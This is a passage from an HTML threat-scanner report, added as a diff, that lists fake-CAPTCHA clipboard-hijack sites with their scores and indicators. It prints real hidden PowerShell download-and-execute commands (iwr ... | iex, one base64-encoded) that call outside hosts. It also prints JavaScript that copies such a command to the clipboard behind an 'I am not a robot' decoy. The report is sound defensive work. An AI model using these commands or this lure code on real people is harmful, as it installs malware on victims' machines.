+
+                    
+                </div>
+            </div>
+        </div>
+        
+        <div class="site-card" data-url="https://indiasproperty.com">
+            <div class="site-header" onclick="toggleSite(this)">
+                <div class="site-header-content">
+                    <div>
+                        <div class="site-url">https://indiasproperty.com</div>
+                        <div style="margin-top: 0.5rem; color: var(--text-light); font-size: 0.9rem;">
+                            50 indicators detected
+                        </div>
+                    </div>
+                    <div class="site-badges">
+                        
+                        <span class="threat-score-badge score-critical">Score: 409</span>
+                        
+                        
+                        
+                        <span class="attack-type-badge">PowerShell</span>
+                        
+                        <span class="attack-type-badge">Clipboard Hijack</span>
+                        
+                    </div>
+                </div>
+            </div>
+            
+            <div class="site-details">
+                <div class="detail-tabs">
+                    <button class="detail-tab active" onclick="showTab(this, 'overview-3')">Overview</button>
+                    <button class="detail-tab" onclick="showTab(this, 'indicators-3')">Indicators</button>
+                    <button class="detail-tab" onclick="showTab(this, 'code-3')">Malicious Code</button>
+                </div>
+                
+                <!-- Overview Tab -->
+                <div id="overview-3" class="tab-content active">
+                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 1rem; margin-bottom: 1.5rem;">
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">3</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">powershell</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">6</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">clipboard</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">3</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">captcha</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">19</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">suspicious keywords</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">2</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">high risk</div>
+                        </div>
+                        
+                    </div>
+                </div>
+                
+                <!-- Indicators Tab -->
+                <div id="indicators-3" class="tab-content">
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">
+                            💻 PowerShell Commands
+                            <span class="indicator-count">3</span>
+                        </h4>
+                        <div class="indicator-list">
+                            
+                            <div class="indicator-item">powershell.exe -w h -nop -c </div>
+                            
+                            <div class="indicator-item">Invoke-Expression</div>
+                            
+                            <div class="indicator-item">New-Object </div>
+                            
+                        </div>
+                    </div>
+                    
+                    
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">
+                            🔍 Suspicious Keywords
+                            <span class="indicator-count">19</span>
+                        </h4>
+                        <div class="indicator-list">
+                            
+                            <div class="indicator-item">command = &#34;&#34;;</div>
+                            
+                            <div class="indicator-item">command = obfuscatedCommandParts.map(partArray =&gt;</div>
+                            
+                            <div class="indicator-item">CAPTCHA Verification</div>
+                            
+                            <div class="indicator-item">Verification ID</div>
+                            
+                            <div class="indicator-item">Ray ID</div>
+                            
+                            <div class="indicator-item">I am not a robot</div>
+                            
+                            <div class="indicator-item">Robot</div>
+                            
+                            <div class="indicator-item">robot</div>
+                            
+                            <div class="indicator-item">Verification</div>
+                            
+                            <div class="indicator-item">verification</div>
+                            
+                        </div>
+                    </div>
+                    
+                    
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">
+                            🌐 Extracted URLs
+                            <span class="indicator-count">2</span>
+                        </h4>
+                        <div class="indicator-list">
+                            
+                            <div class="indicator-item">https://i.postimg.cc/k4zrz92z/111.png</div>
+                            
+                            <div class="indicator-item">https://2captcha.com/dist/web/assets/google-privacy-policy-Cb0CGVRT.svg</div>
+                            
+                        </div>
+                    </div>
+                    
+                </div>
+                
+                <!-- Code Tab -->
+                <div id="code-3" class="tab-content">
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">📋 Clipboard Manipulation Code</h4>
+                        <p style="color: var(--text-light); font-size: 0.9rem; margin-bottom: 1rem;">
+                            Showing first 2 of 6 entries (truncated for performance)
+                        </p>
+                        
+                        <div class="code-block">
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                            <pre>...ndChild(textarea); textarea.select(); document.execCommand(&#39;copy&#39;); document.body.removeChild(textarea);...</pre>
+                        </div>
+                        
+                        <div class="code-block">
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                            <pre>...reventDefault(); if (e.clipboardData) { e.clipboardData.setData(&#39;text/plain&#39;, command); console.log(&#39;✅ Кома...</pre>
+                        </div>
+                        
+                    </div>
+                    
+                    
+                    
+
+                    
+
+                    
+                </div>
+            </div>
+        </div>
+        
+        <div class="site-card" data-url="https://www.bratusferramentas.grupomoltz.com.br/">
+            <div class="site-header" onclick="toggleSite(this)">
+                <div class="site-header-content">
+                    <div>
+                        <div class="site-url">https://www.bratusferramentas.grupomoltz.com.br/</div>
+                        <div style="margin-top: 0.5rem; color: var(--text-light); font-size: 0.9rem;">
+                            42 indicators detected
+                        </div>
+                    </div>
+                    <div class="site-badges">
+                        
+                        <span class="threat-score-badge score-critical">Score: 371</span>
+                        
+                        
+                        
+                        <span class="attack-type-badge">PowerShell</span>
+                        
+                        <span class="attack-type-badge">Clipboard Hijack</span>
+                        
+                    </div>
+                </div>
+            </div>
+            
+            <div class="site-details">
+                <div class="detail-tabs">
+                    <button class="detail-tab active" onclick="showTab(this, 'overview-4')">Overview</button>
+                    <button class="detail-tab" onclick="showTab(this, 'indicators-4')">Indicators</button>
+                    <button class="detail-tab" onclick="showTab(this, 'code-4')">Malicious Code</button>
+                </div>
+                
+                <!-- Overview Tab -->
+                <div id="overview-4" class="tab-content active">
+                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 1rem; margin-bottom: 1.5rem;">
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">3</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">powershell</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">5</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">clipboard</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">7</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">captcha</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">3</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">base64</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">1</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">redirect follows</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">13</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">suspicious keywords</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">3</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">high risk</div>
+                        </div>
+                        
+                    </div>
+                </div>
+                
+                <!-- Indicators Tab -->
+                <div id="indicators-4" class="tab-content">
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">
+                            💻 PowerShell Commands
+                            <span class="indicator-count">3</span>
+                        </h4>
+                        <div class="indicator-list">
+                            
+                            <div class="indicator-item">POWerShEll -W h &#34;[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(&#39;aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50&#39;)) | iex&#34;`;</div>
+                            
+                            <div class="indicator-item">iex (iwr &#39;https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt&#39; -UseBasicParsing)</div>
+                            
+                            <div class="indicator-item">iwr </div>
+                            
+                        </div>
+                    </div>
+                    
+                    
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">
+                            🔍 Suspicious Keywords
+                            <span class="indicator-count">13</span>
+                        </h4>
+                        <div class="indicator-list">
+                            
+                            <div class="indicator-item">CAPTCHA Verification</div>
+                            
+                            <div class="indicator-item">Verification ID</div>
+                            
+                            <div class="indicator-item">I am not a robot</div>
+                            
+                            <div class="indicator-item">robot</div>
+                            
+                            <div class="indicator-item">Robot</div>
+                            
+                            <div class="indicator-item">Verification</div>
+                            
+                            <div class="indicator-item">verification</div>
+                            
+                            <div class="indicator-item">verification-id</div>
+                            
+                            <div class="indicator-item">verification_id</div>
+                            
+                            <div class="indicator-item">Verify You Are Human</div>
+                            
+                        </div>
+                    </div>
+                    
+                    
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">
+                            🌐 Extracted URLs
+                            <span class="indicator-count">2</span>
+                        </h4>
+                        <div class="indicator-list">
+                            
+                            <div class="indicator-item">https://use.fontawesome.com/releases/v5.0.0/css/all.css</div>
+                            
+                            <div class="indicator-item">https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png</div>
+                            
+                        </div>
+                    </div>
+                    
+                </div>
+                
+                <!-- Code Tab -->
+                <div id="code-4" class="tab-content">
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">📋 Clipboard Manipulation Code</h4>
+                        <p style="color: var(--text-light); font-size: 0.9rem; margin-bottom: 1rem;">
+                            Showing first 2 of 4 entries (truncated for performance)
+                        </p>
+                        
+                        <div class="code-block">
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                            <pre>...tempTextArea.select(); document.execCommand(&#34;copy&#34;); document.body.removeChild(tempText...</pre>
+                        </div>
+                        
+                        <div class="code-block">
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                            <pre>...k&#34;, function (event) { event.preventDefault(); checkboxBtn.disabled = true; runClickedCheckboxEffects(); }); } } function runClickedCheckboxEffects() { hideCaptchaCheckbox(); setTimeout(function(){ showCaptchaLoading(); },500); setTimeout(function(){ showVerifyWindow(); },900) } function showCaptchaLoading() { checkboxBtnSpinner.style.visibility = &#34;visible&#34;; checkboxBtnSpinner.style.opacity = &#34;1&#34;; checkboxBtnSpinner.style.animation = &#34;spin 1s linear infinite&#34;; } function hideCaptchaLoading() { checkboxBtnSpinner.style.opacity = &#34;0&#34;; checkboxBtnSpinner.style.animation = &#34;none&#34;; setTimeout(function() { checkboxBtnSpinner.style.visibility = &#34;hidden&#34;; }, 500); } function hideCaptchaCheckbox() { checkboxBtn.style.visibility = &#34;hidden&#34;; checkboxBtn.style.opacity = &#34;0&#34;; } function showCaptchaCheckbox() { checkboxBtn.style.width = &#34;100%&#34;; checkboxBtn.style.height = &#34;100%&#34;; checkboxBtn.style.borderRadius = &#34;2px&#34;; checkboxBtn.style.margin = &#34;0&#34;; checkboxBtn.style.opacity = &#34;1&#34;; } function hideCaptchaCheckbox() { checkboxBtn.style.width = &#34;4px&#34;; checkboxBtn.style.height = &#34;4px&#34;; checkboxBtn.style.borderRadius = &#34;50%&#34;; checkboxBtn.style.marginLeft = &#34;25px&#34;; checkboxBtn.style.marginTop = &#34;33px&#34;; checkboxBtn.style.opacity = &#34;0&#34;; } function showCaptchaLoading() { checkboxBtnSpinner.style.visibility = &#34;visible&#34;; checkboxBtnSpinner.style.opacity = &#34;1&#34;; } function hideCaptchaLoading() { checkboxBtnSpinner.style.visibility = &#34;hidden&#34;; checkboxBtnSpinner.style.opacity = &#34;0&#34;; } function generateRandomNumber() { const min = 1000; const max = 9999; return Math.floor(Math.random() * (max - min + 1) + min).toString(); } function closeverifywindow() { verifywindow.style.display = &#34;none&#34;; verifywindow.style.visibility = &#34;hidden&#34;; verifywindow.style.opacity = &#34;0&#34;; showCaptchaCheckbox(); hideCaptchaLoading(); checkboxBtn.disabled = false; } function isverifywindowVisible() { return verifywindow.style.display !== &#34;none&#34; &amp;&amp; verifywindow.style.display !== &#34;&#34;; } function setClipboardCopyData(textToCopy){ const tempTextArea = document.createElement(&#34;textarea&#34;); tempTextArea.value = textToCopy; document.body.append(tempTextArea); tempTextArea.select(); document.execCommand(&#34;copy&#34;); document.body.removeChild(tempTextArea); } function stageClipboard(commandToRun, verification_id){ const suffix = &#34; # &#34; const ploy = &#34;â &#39;&#39;I am not a robot - reCAPTCHA Verification ID: &#34; const end = &#34;&#39;&#39;&#34; const textToCopy = commandToRun setClipboardCopyData(textToCopy); } function showVerifyWindow() {...</pre>
+                        </div>
+                        
+                    </div>
+                    
+                    
+                    
+
+                    
+
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">🛰️ Redirect Follower Findings (1)</h4>
+                        <div class="indicator-list">
+                            
+                            <div class="indicator-item">
+                                <div><strong>Source:</strong> inline_js</div>
+                                <div><strong>Method:</strong> base64_payload</div>
+                                <div><strong>Original:</strong> <a href="https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt" target="_blank">https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt</a></div>
+                                
+                                
+                                <div class="code-block"><pre>iex (iwr &#39;https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt&#39; -UseBasicParsing).Content</pre></div>
+                                <div><strong>Status:</strong> error: HTTPSConnectionPool(host=&#39;amazon-ny-gifts.com&#39;, port=443): Max retries exceeded with url: /shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt (Caused by NameResolutionError(&#34;&lt;urllib3.connection.</div>
+                                
+                            </div>
+                            
+                            
+                        </div>
+                    </div>
+                    
+                </div>
+            </div>
+        </div>
+        
+        <div class="site-card" data-url="https://blessdayservices.org/up/">
+            <div class="site-header" onclick="toggleSite(this)">
+                <div class="site-header-content">
+                    <div>
+                        <div class="site-url">https://blessdayservices.org/up/</div>
+                        <div style="margin-top: 0.5rem; color: var(--text-light); font-size: 0.9rem;">
+                            40 indicators detected
+                        </div>
+                    </div>
+                    <div class="site-badges">
+                        
+                        <span class="threat-score-badge score-critical">Score: 309</span>
+                        
+                        
+                        
+                        <span class="attack-type-badge">PowerShell</span>
+                        
+                        <span class="attack-type-badge">Clipboard Hijack</span>
+                        
+                    </div>
+                </div>
+            </div>
+            
+            <div class="site-details">
+                <div class="detail-tabs">
+                    <button class="detail-tab active" onclick="showTab(this, 'overview-5')">Overview</button>
+                    <button class="detail-tab" onclick="showTab(this, 'indicators-5')">Indicators</button>
+                    <button class="detail-tab" onclick="showTab(this, 'code-5')">Malicious Code</button>
+                </div>
+                
+                <!-- Overview Tab -->
+                <div id="overview-5" class="tab-content active">
+                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 1rem; margin-bottom: 1.5rem;">
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">3</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">powershell</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">5</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">clipboard</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">1</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">downloads</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">4</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">captcha</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">13</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">suspicious keywords</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">2</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">high risk</div>
+                        </div>
+                        
+                    </div>
+                </div>
+                
+                <!-- Indicators Tab -->
+                <div id="indicators-5" class="tab-content">
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">
+                            💻 PowerShell Commands
+                            <span class="indicator-count">3</span>
+                        </h4>
+                        <div class="indicator-list">
+                            
+                            <div class="indicator-item">powershell -ArgumentList &#39;-w hidden -c iwr https://irp.cdn-website.com/45d8c6e0/files/uploaded/32.ps1 | iex&#39; -WindowStyle Hidden\&#34;&#34;;</div>
+                            
+                            <div class="indicator-item">powershell &#34; + htaPath;</div>
+                            
+                            <div class="indicator-item">iwr </div>
+                            
+                        </div>
+                    </div>
+                    
+                    
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">
+                            🔍 Suspicious Keywords
+                            <span class="indicator-count">13</span>
+                        </h4>
+                        <div class="indicator-list">
+                            
+                            <div class="indicator-item">CAPTCHA Verification</div>
+                            
+                            <div class="indicator-item">Verification Hash</div>
+                            
+                            <div class="indicator-item">I am not a robot</div>
+                            
+                            <div class="indicator-item">Robot</div>
+                            
+                            <div class="indicator-item">robot</div>
+                            
+                            <div class="indicator-item">Verification</div>
+                            
+                            <div class="indicator-item">verification</div>
+                            
+                            <div class="indicator-item">verification-id</div>
+                            
+                            <div class="indicator-item">verification_id</div>
+                            
+                            <div class="indicator-item">To better prove you are not a robot</div>
+                            
+                        </div>
+                    </div>
+                    
+                    
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">
+                            🌐 Extracted URLs
+                            <span class="indicator-count">5</span>
+                        </h4>
+                        <div class="indicator-list">
+                            
+                            <div class="indicator-item">https://use.fontawesome.com/releases/v5.0.0/css/all.css</div>
+                            
+                            <div class="indicator-item">https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png</div>
+                            
+                            <div class="indicator-item">https://www.google.com/intl/en/policies/privacy/</div>
+                            
+                            <div class="indicator-item">https://www.google.com/intl/en/policies/terms/</div>
+                            
+                            <div class="indicator-item">https://irp.cdn-website.com/45d8c6e0/files/uploaded/32.ps1</div>
+                            
+                        </div>
+                    </div>
+                    
+                </div>
+                
+                <!-- Code Tab -->
+                <div id="code-5" class="tab-content">
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">📋 Clipboard Manipulation Code</h4>
+                        <p style="color: var(--text-light); font-size: 0.9rem; margin-bottom: 1rem;">
+                            Showing first 2 of 4 entries (truncated for performance)
+                        </p>
+                        
+                        <div class="code-block">
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                            <pre>...); tempTextArea.select(); document.execCommand(&#34;copy&#34;); document.body.removeChild(tempTextA...</pre>
+                        </div>
+                        
+                        <div class="code-block">
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                            <pre>...ck&#34;, function (event) { event.preventDefault(); checkboxBtn.disabled = true; runClickedCheckboxEffects(); }); } } function runClickedCheckboxEffects() { hideCaptchaCheckbox(); setTimeout(function(){ showCaptchaLoading(); },500); setTimeout(function(){ showVerifyWindow(); },900) } function showCaptchaLoading() { checkboxBtnSpinner.style.visibility = &#34;visible&#34;; checkboxBtnSpinner.style.opacity = &#34;1&#34;; checkboxBtnSpinner.style.animation = &#34;spin 1s linear infinite&#34;; } function hideCaptchaLoading() { checkboxBtnSpinner.style.opacity = &#34;0&#34;; checkboxBtnSpinner.style.animation = &#34;none&#34;; setTimeout(function() { checkboxBtnSpinner.style.visibility = &#34;hidden&#34;; }, 500); } function hideCaptchaCheckbox() { checkboxBtn.style.visibility = &#34;hidden&#34;; checkboxBtn.style.opacity = &#34;0&#34;; } function showCaptchaCheckbox() { checkboxBtn.style.width = &#34;100%&#34;; checkboxBtn.style.height = &#34;100%&#34;; checkboxBtn.style.borderRadius = &#34;2px&#34;; checkboxBtn.style.margin = &#34;21px 0 0 12px&#34;; checkboxBtn.style.opacity = &#34;1&#34;; } function hideCaptchaCheckbox() { checkboxBtn.style.width = &#34;4px&#34;; checkboxBtn.style.height = &#34;4px&#34;; checkboxBtn.style.borderRadius = &#34;50%&#34;; checkboxBtn.style.marginLeft = &#34;25px&#34;; checkboxBtn.style.marginTop = &#34;33px&#34;; checkboxBtn.style.opacity = &#34;0&#34;; } function showCaptchaLoading() { checkboxBtnSpinner.style.visibility = &#34;visible&#34;; checkboxBtnSpinner.style.opacity = &#34;1&#34;; } function hideCaptchaLoading() { checkboxBtnSpinner.style.visibility = &#34;hidden&#34;; checkboxBtnSpinner.style.opacity = &#34;0&#34;; } function generateRandomNumber() { const min = 1000; const max = 9999; return Math.floor(Math.random() * (max - min + 1) + min).toString(); } function closeverifywindow() { verifywindow.style.display = &#34;none&#34;; verifywindow.style.visibility = &#34;hidden&#34;; verifywindow.style.opacity = &#34;0&#34;; showCaptchaCheckbox(); hideCaptchaLoading(); checkboxBtn.disabled = false; } function isverifywindowVisible() { return verifywindow.style.display !== &#34;none&#34; &amp;&amp; verifywindow.style.display !== &#34;&#34;; } function setClipboardCopyData(textToCopy){ const tempTextArea = document.createElement(&#34;textarea&#34;); tempTextArea.value = textToCopy; document.body.append(tempTextArea); tempTextArea.select(); document.execCommand(&#34;copy&#34;); document.body.removeChild(tempTextArea); } function stageClipboard(commandToRun, verification_id){ const suffix = &#34; # &#34; const ploy = &#34;â &#39;&#39;I am not a robot - reCAPTCHA Verification Hash: &#34; const end = &#34;&#39;&#39;&#34; const textToCopy = commandToRun + suffix + ploy + verification_id + end setClipboardCopyData(textToCopy); } function showVerifyWindow()...</pre>
+                        </div>
+                        
+                    </div>
+                    
+                    
+                    
+
+                    
+
+                    
+                </div>
+            </div>
+        </div>
+        
+        <div class="site-card" data-url="https://82.146.62.232/">
+            <div class="site-header" onclick="toggleSite(this)">
+                <div class="site-header-content">
+                    <div>
+                        <div class="site-url">https://82.146.62.232/</div>
+                        <div style="margin-top: 0.5rem; color: var(--text-light); font-size: 0.9rem;">
+                            47 indicators detected
+                        </div>
+                    </div>
+                    <div class="site-badges">
+                        
+                        <span class="threat-score-badge score-critical">Score: 307</span>
+                        
+                        
+                        
+                        <span class="attack-type-badge">Fake CAPTCHA</span>
+                        
+                        <span class="attack-type-badge">Redirect Chain</span>
+                        
+                    </div>
+                </div>
+            </div>
+            
+            <div class="site-details">
+                <div class="detail-tabs">
+                    <button class="detail-tab active" onclick="showTab(this, 'overview-6')">Overview</button>
+                    <button class="detail-tab" onclick="showTab(this, 'indicators-6')">Indicators</button>
+                    <button class="detail-tab" onclick="showTab(this, 'code-6')">Malicious Code</button>
+                </div>
+                
+                <!-- Overview Tab -->
+                <div id="overview-6" class="tab-content active">
+                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 1rem; margin-bottom: 1.5rem;">
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">2</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">captcha</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">7</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">base64</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">1</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">redirects</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">1</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">redirect follows</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">4</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">suspicious keywords</div>
+                        </div>
+                        
+                    </div>
+                </div>
+                
+                <!-- Indicators Tab -->
+                <div id="indicators-6" class="tab-content">
+                    
+                    
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">
+                            🔍 Suspicious Keywords
+                            <span class="indicator-count">4</span>
+                        </h4>
+                        <div class="indicator-list">
+                            
+                            <div class="indicator-item">exec(ua) != nuii){rv = parseFioat(RegExp.$i);}}eise if (n.appName == &#34;Netscape&#34;){rv = ii;re = new RegExp(&#34;Trident/.*rv:([0-9]+[\.0-9]*)&#34;);if (re.exec(ua) != nuii){rv = parseFioat(RegExp.$i);}}}return rv;}})(window, document, navigator)</div>
+                            
+                            <div class="indicator-item">robot</div>
+                            
+                            <div class="indicator-item">exec(</div>
+                            
+                            <div class="indicator-item">hidden</div>
+                            
+                        </div>
+                    </div>
+                    
+                    
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">
+                            🌐 Extracted URLs
+                            <span class="indicator-count">15</span>
+                        </h4>
+                        <div class="indicator-list">
+                            
+                            <div class="indicator-item">https://svetvip.ru/</div>
+                            
+                            <div class="indicator-item">https://api.whatsapp.com/send?phone=79258627909</div>
+                            
+                            <div class="indicator-item">https://api.whatsapp.com/send?phone=79258627909</div>
+                            
+                            <div class="indicator-item">https://svetvip.ru/catalog/vstraivaemye_svetilniki/</div>
+                            
+                            <div class="indicator-item">https://svetvip.ru/catalog/trekovye_i_shinnye_svetilniki/</div>
+                            
+                        </div>
+                    </div>
+                    
+                </div>
+                
+                <!-- Code Tab -->
+                <div id="code-6" class="tab-content">
+                    
+                    
+                    
+
+                    
+
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">🛰️ Redirect Follower Findings (1)</h4>
+                        <div class="indicator-list">
+                            
+                            <div class="indicator-item">
+                                <div><strong>Source:</strong> inline_js</div>
+                                <div><strong>Method:</strong> script_src</div>
+                                <div><strong>Original:</strong> <a href="https://svetvip.ru/bitrix/spread.php?s=QklUUklYX1NNX0FCVEVTVF91MgEBMTc5NTY2MjA5NAEvAQEBAkJJVFJJWF9TTV9TQUxFX1VJRAE2N2FiYjNjMzBiMzYzOTczZDQ0ZTUwODI4NzFmY2M3ZQExNzk1NjYyMDk0AS8BAQEC&amp;k=afa61a484f485e878b832d227579cf5d" target="_blank">https://svetvip.ru/bitrix/spread.php?s=QklUUklYX1NNX0FCVEVTVF91MgEBMTc5NTY2MjA5NAEvAQEBAkJJVFJJWF9TTV9TQUxFX1VJRAE2N2FiYjNjMzBiMzYzOTczZDQ0ZTUwODI4NzFmY2M3ZQExNzk1NjYyMDk0AS8BAQEC&amp;k=afa61a484f485e878b832d227579cf5d</a></div>
+                                
+                                <div><strong>Final:</strong> <a href="https://svetvip.ru/bitrix/spread.php?s=QklUUklYX1NNX0FCVEVTVF91MgEBMTc5NTY2MjA5NAEvAQEBAkJJVFJJWF9TTV9TQUxFX1VJRAE2N2FiYjNjMzBiMzYzOTczZDQ0ZTUwODI4NzFmY2M3ZQExNzk1NjYyMDk0AS8BAQEC&amp;k=afa61a484f485e878b832d227579cf5d" target="_blank">https://svetvip.ru/bitrix/spread.php?s=QklUUklYX1NNX0FCVEVTVF91MgEBMTc5NTY2MjA5NAEvAQEBAkJJVFJJWF9TTV9TQUxFX1VJRAE2N2FiYjNjMzBiMzYzOTczZDQ0ZTUwODI4NzFmY2M3ZQExNzk1NjYyMDk0AS8BAQEC&amp;k=afa61a484f485e878b832d227579cf5d</a></div>
+                                
+                                
+                                <div class="code-block"><pre>new Image().src=&#39;https://svetvip.ru/bitrix/spread.php?s=QklUUklYX1NNX0FCVEVTVF91MgEBMTc5NTY2MjA5NAEvAQEBAkJJVFJJWF9TTV9TQUxFX1VJRAE2N2FiYjNjMzBiMzYzOTczZDQ0ZTUwODI4NzFmY2M3ZQExNzk1NjYyMDk0AS8BAQEC&amp;k=afa61a484f485e878b832d227579cf5d&#39;;</pre></div>
